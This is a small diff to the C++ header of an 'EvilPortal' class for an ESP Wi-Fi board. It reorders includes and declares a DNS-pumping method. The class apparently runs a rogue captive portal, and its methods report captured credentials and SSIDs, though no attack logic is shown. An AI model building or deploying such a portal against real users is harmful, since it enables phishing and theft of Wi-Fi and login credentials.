@@ -3,8 +3,8 @@
 
 #include <DNSServer.h>
 #include <ESPAsyncWebServer.h>
-#include <globals.h>
 #include <WiFiType.h>
+#include <globals.h>
 
 class EvilPortal {
     class CaptiveRequestHandler : public AsyncWebHandler {
@@ -30,6 +30,9 @@ public:
     void setupRoutes(void);
     void loop(void);
     void processRequests(void);
+    // Answers up to maxRequests queued DNS lookups. Call it as often as the
+    // caller's loop allows, not on a heartbeat: see the note in the .cpp.
+    void pumpDNS(uint8_t maxRequests = 8);
 
     bool hasCredentials();
     String getCapturedSSID();
